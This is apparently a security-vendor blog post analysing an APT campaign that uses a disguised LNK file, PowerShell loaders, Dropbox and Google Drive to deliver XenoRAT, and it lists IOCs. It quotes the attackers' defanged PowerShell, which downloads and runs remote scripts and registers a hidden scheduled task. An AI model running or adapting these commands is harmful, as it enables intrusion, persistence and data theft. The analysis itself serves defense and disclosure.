						<h1 class="post-title single_blog_inner__Title">
							APT Attacks Using Cloud Storage						</h1>

												<div class="slider-post-meta-items tab-small-col-meta blog-details-meta-wrap">

								<div class="post-featured-image">
									<img class="img-fluid" src="https://asec.ahnlab.com/wp-content/uploads/2023/12/57_north-korea-hacker_02-803x490.png?crop=1" alt="APT Attacks Using Cloud Storage">
									</div>
								
				<div class="post-body clearfix single-blog-header single-blog-inner blog-single-block blog-details-content">
					<!-- Article content -->
					<div class="entry-content clearfix">
						
						<p>AhnLab SEcurity intelligence Center (ASEC) has been sharing cases of attacks in which threat actors utilize cloud services such as Google Drive, OneDrive, and Dropbox to collect user information or distribute malware. <a href="https://asec.ahnlab.com/en/65076/"><strong>[1]</strong></a><a href="https://asec.ahnlab.com/en/59057/"><strong>[2]</strong></a><a href="https://asec.ahnlab.com/en/51751/"><strong>[3]</strong></a><strong>&nbsp;</strong>The threat actors mainly upload malicious scripts, RAT malware strains, and decoy documents onto the cloud servers to perform attacks. The uploaded files work systematically and perform various malicious behaviors.</p>
<p>The process from the first distribution file to the execution of RAT malware is as follows:</p>
<figure class="image"><img decoding="async" src="https://image.ahnlab.com/atip/content/atcp/2024/05/%EB%8F%99%EC%9E%91%EA%B5%AC%EC%A1%B0-1.png?resize=1024%2C520&amp;ssl=1" alt=""></figure>
<p>In such attack type, multiple files are connected as seen in Figure 1, and they all operate via the threat actor&#8217;s cloud. As such, malware strains not confirmed in the article may be downloaded or various malicious behaviors such as leaking information may be performed.</p>
<p>EXE and shortcut files (*.LNK) were the first files to be distributed, and this article will explain the operation process through an LNK file, a file type that is frequently used in APT attacks.</p>
<p><strong>1.&nbsp;Distributed File (Shortcut File (*.LNK))</strong></p>
<p>The confirmed LNK file is disguised as an HTML document file as seen below and has a name that lures users to click it.</p>
<ul>
<li>Police Cyber Investigation Bureau – Internet Use History (check now to keep your PC safe).html.lnk</li>
</ul>
<figure class="image"><img decoding="async" src="https://image.ahnlab.com/atip/content/atcp/2024/05/lnk%EC%86%8D%EC%84%B1.png?w=448&amp;ssl=1" alt=""></figure>
<p>The LNK file contains PowerShell commands. The file decodes Base64-encoded commands after being run and executes the commands after saving them as the ms_temp_08.ps1 file inside the TEMP folder.</p>
<pre><code class="language-plaintext">..\..\..\..\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe  
"$ss =\"[Base64-encoded commands]\"; 
$aa = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($ss));
$cc = [System.IO.Path]::GetTempPath();
$dd = \"ms_temp_08.ps1\";
$ee = Join-Path $cc $dd;
$aa | Out-File -FilePath $ee; 
$aaaaa= 89897878; 
powershell -windowstyle hidden -ExecutionPolicy Bypass $ee"</code></pre>
<ul>
<li><strong>ms_temp_08.ps1</strong></li>
</ul>
<p>ms_temp_08.ps1 downloads decoy documents and additional files and registers them to the Task Scheduler after being created. The following PowerShell commands are executed:</p>
<pre><code class="language-plaintext">$hhh = Join-Path ([System.IO.Path]::GetTempPath()) "Police Cyber Investigation Bureau - Internet Use History (check now to keep your PC safe).html";
Invoke-WebRequest -Uri "hxxps://dl.dropboxusercontent[.]com/scl/fi/lpoo2f42y7x5uy6druxa0/SoJ****.html?rlkey=ckv37q02rh9j1qsw7ed28bimv&amp;st=64zsdvba&amp;dl=0" -OutFile $hhh; &amp; $hhh;
$filePath = Join-Path ([System.IO.Path]::GetTempPath()) "ms_update.ps1";
$str = '$aaa = Join-Path ([System.IO.Path]::GetTempPath()) "info.ps1"; Invoke-WebRequest -Uri "hxxps://dl.dropboxusercontent[.]com/scl/fi/9d9msk907asjhilhjr75m/SoJ****-X.txt?rlkey=f8rydbv8tf28i9f2fwkrux6wo&amp;st=78byjswv&amp;dl=0" -OutFile $aaa; &amp; $aaa;';
$str | Out-File -FilePath $filePath -Encoding UTF8;
$action = New-ScheduledTaskAction -Execute 'PowerShell.exe' -Argument '-WindowStyle Hidden -nop  -NonInteractive -NoProfile -ExecutionPolicy Bypass -Command "&amp; {$filePath = Join-Path ([System.IO.Path]::GetTempPath()) \"ms_update.ps1\";powershell -windowstyle hidden -ExecutionPolicy Bypass -File $filePath;}"';
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(5) -RepetitionInterval (New-TimeSpan -Minutes 30);
$settings = New-ScheduledTaskSettingsSet -Hidden;
Register-ScheduledTask -TaskName "MicrosoftUpdate" -Action $action -Trigger $trigger -Settings $settings;
$aaa = Join-Path ([System.IO.Path]::GetTempPath()) "first.ps1";
Invoke-WebRequest -Uri "hxxps://dl.dropboxusercontent[.]com/scl/fi/gswgcmbktt1hthntozgep/SoJ****-F.txt?rlkey=n9xglo02xfnf14b9btgtw8aqi&amp;st=w9zt1es5&amp;dl=0" -OutFile $aaa; &amp; $aaa;</code></pre>
<p>The PowerShell commands firstly download the decoy document file (normal HTML file). The downloaded file is saved and executed as &#8220;Police Cyber Investigation Bureau &#8211; Internet Use History (check now to keep your PC safe).html&#8221;, making it difficult for users to realize that malicious behaviors are taking place as the file name is the same as that of the LNK file. The ASEC team was unable to check the file&#8217;s content because it could not be downloaded at the time of analysis.</p>
<p>After the above process, a PowerShell script file named ms_update.ps1 is created in the TEMP folder and registered to the Task Scheduler as MicrosoftUpdate so that it is run every 30 minutes.</p>
<figure class="image"><img decoding="async" src="https://image.ahnlab.com/atip/content/atcp/2024/05/%EC%9E%91%EC%97%85%EC%8A%A4%EC%BC%80%EC%A4%84%EB%9F%AC-1.png?resize=1024%2C231&amp;ssl=1" alt=""></figure>
<p>Additionally, a file named SoJ****-F.txt is downloaded from the threat actor&#8217;s Dropbox and saved into the TEMP folder as first.ps1 to be executed.</p>
<ul>
<li><strong>ms_update.ps1</strong></li>
</ul>
<p>As mentioned earlier, this script file downloads a file named SoJ****-F.txt from the threat actor&#8217;s Dropbox and saves it into the TEMP folder as info.ps1 to be executed.</p>
<pre><code class="language-plaintext">$aaa = Join-Path ([System.IO.Path]::GetTempPath()) "info.ps1";
Invoke-WebRequest -Uri "hxxps://dl.dropboxusercontent[.]com/scl/fi/9d9msk907asjhilhjr75m/So****g-X.txt?rlkey=f8rydbv8tf28i9f2fwkrux6wo&amp;st=78byjswv&amp;dl=0" -OutFile $aaa; &amp; $aaa;</code></pre>
<p>During the analysis, the team confirmed that the threat actor&#8217;s Dropbox contains decoy documents in various formats such as HTML, Word document, HWP (Hangul Word Processor) document, and PDF. The following decoy documents were found subsequently.</p>
<figure class="image"><img decoding="async" src="https://image.ahnlab.com/atip/content/atcp/2024/05/%EB%94%94%EC%BD%94%EC%9D%B41-1.png?resize=1024%2C765&amp;ssl=1" alt=""></figure>
<figure class="image"><img decoding="async" src="https://image.ahnlab.com/atip/content/atcp/2024/05/%EB%94%94%EC%BD%94%EC%9D%B43-1.png?resize=1024%2C868&amp;ssl=1" alt=""></figure>
<figure class="image"><img decoding="async" src="https://image.ahnlab.com/atip/content/atcp/2024/05/%EB%94%94%EC%BD%94%EC%9D%B42-1.png?resize=1024%2C585&amp;ssl=1" alt=""></figure>
<figure class="image"><img decoding="async" src="https://image.ahnlab.com/atip/content/atcp/2024/05/%EB%94%94%EC%BD%94%EC%9D%B44-1.png?resize=1024%2C566&amp;ssl=1" alt=""></figure>
<p>As seen from the screenshots above, the threat actor owns documents of various themes. Some of the documents found additionally are university cooperation requests, business delivery confirmations, and documents related to foreign affairs. Given that the threat actor also uses files disguised as documents such as money deposit contracts, insurance, and loans that include the personal information of specific individuals, it appears that they distribute malware to specific designated targets.</p>
<p><strong>2. Malware Downloaded via Cloud</strong></p>
<p>The aforementioned LNK file downloads first.ps1(SoJ****-F.txt) and info.ps1(SoJ****-X.txt) files from the threat actor&#8217;s cloud. The files could not be downloaded from the Dropbox mentioned above at the time of analysis, but the team collected such script files from another Dropbox in the threat actor&#8217;s possession.</p>
<p>The uploaded script files are named after certain individuals, hinting that the threat actor carried out different malicious behaviors for each of them. The names of the additionally discovered files are as follows:</p>

<p style="text-align:center;"><span style="color:#6B7684;font-size:14px;">Table 1. Confirmed script file names</span></p>
<p>The threat actor created a folder for each user, and each contained a decoy document, [name]-F.txt, and [name]-X.txt files. The script files all use the token-based authentication method for the authentication of Dropbox, and each file contains client_id, client_secret, and refresh_token values.</p>
<p>Below is the analysis information for each type.</p>
<ul>
<li><strong>first.ps1(SoJ****-F.txt)</strong></li>
</ul>
<p>This is a script file that contains PowerShell commands. Once launched, it collects the user&#8217;s PC information and uploads it onto the threat actor&#8217;s Dropbox.</p>
<p>Upon execution, it collects the user&#8217;s PC information and saves it into TEMP or APPDATA folder as [IP Address]-[Current Time]-Run-[name].txt (or [IP Address]-[Current Time]-RRR-[name].txt). The list below shows which pieces of information are collected.</p>
<ol>
<li>Information about OS Caption, Version, BuildNumber, and OSArchitecture</li>
<li>Information about the installed anti-malware solution</li>
<li>Last boot time</li>
<li>PC type (Laptop/Desktop)</li>
<li>Process information</li>
<li>Information about the PowerShell execution policy</li>
</ol>
<p>The information collected afterward is uploaded onto the threat actor&#8217;s Dropbox as [IP Address]-[Current Time]-Run-[name].txt (or [IP Address]-[Current Time]-RRR-[name].txt).</p>
<figure class="image"><img decoding="async" src="https://image.ahnlab.com/atip/content/atcp/2024/05/%EC%9C%A0%EC%B6%9C-%EC%A0%95%EB%B3%B4.png?resize=1024%2C498&amp;ssl=1" alt=""></figure>
<ul>
<li><strong>info.ps1(SoJ****-X.txt)</strong></li>
</ul>
<p>This is a script file that contains PowerShell commands, and once launched, it uploads certain files onto the threat actor&#8217;s Dropbox and downloads additional malware strains to launch them.</p>
<p>It creates [IP Address]-[Current Time]-XXX-[name].txt file inside TEMP or APPDATA folder and uploads it onto Dropbox without changing the name. The file did not save any data at the time of analysis, and its purpose is thought to check if the script was executed. However, if the threat actor modifies the script code in the future, it may collect and leak various types of information.</p>
<p>After uploading the file, it downloads additional malware strains using Google Drive instead of Dropbox. The files downloaded through Google Drive are saved in the TEMP folder and have system-xn.dat in their names.</p>
<pre><code class="language-plaintext">$dropboxShareLink = "hxxps://drive.google.com/uc?export=download&amp;id=[omitted]"

<p>The threat actor changed the front part of the file (file signature) as shown below so that it looks like an RTF document format.</p>
<figure class="image"><img decoding="async" src="https://image.ahnlab.com/atip/content/atcp/2024/05/%EC%B6%94%EA%B0%80-%ED%8C%8C%EC%9D%BC.png?w=625&amp;ssl=1" alt=""></figure>
<p>The compressed file can be checked after changing the altered 7 bytes to the GZ compressed file&#8217;s file signature, the value confirmed in the script above.</p>
<figure class="image"><img decoding="async" src="https://image.ahnlab.com/atip/content/atcp/2024/05/%EC%95%95%EC%B6%95%ED%8C%A1%EB%A6%AC.png?w=918&amp;ssl=1" alt=""></figure>
<p>The decompressed data is a C# (.NET) file, and the threat actor calls the inner &#8220;Main&#8221; Method and runs the file so that the malware can be executed in a fileless format.</p>
<ul>
<li><strong>system-xn.dat</strong></li>
</ul>
<p>The malware that is launched through the above process is XenoRAT which can perform various malicious behaviors such as loading malware, launching and terminating processes, and communicating with the C2 server based on the threat actor&#8217;s commands. It is customized by the threat actor and uses &#8220;swolf-20010512&#8221; as the mutex name.</p>
<p>C2: 159.100.29[.]122:8811</p>
<figure class="image"><img decoding="async" src="https://image.ahnlab.com/atip/content/atcp/2024/05/rat-2.png?resize=1024%2C575&amp;ssl=1" alt=""></figure>
<p>The following email addresses of the threat actor were confirmed during the analysis:</p>
<ul>
<li>kumasancar@gmail[.]com</li>
<li>effortnully@gmail[.]com</li>
<li>tangdang77790@gmail[.]com</li>
<li>tantanibox@gmail[.]com</li>
<li>swolf0512@gmail[.]com</li>
</ul>
<p>As explained earlier, the threat actor&#8217;s cloud contains multiple decoy document files that store personal information. The threat actor appears to set the attack targets in advance and distribute malware after continuously collecting relevant information. Users are advised to take extra caution as when malware strains are run, they not only leak information and download additional malware strains but also perform malicious activities such as controlling the affected system. Additionally, users must check if a file&#8217;s extension and format match before running it as the team has recently found multiple malware strains that utilize shortcut files.</p>
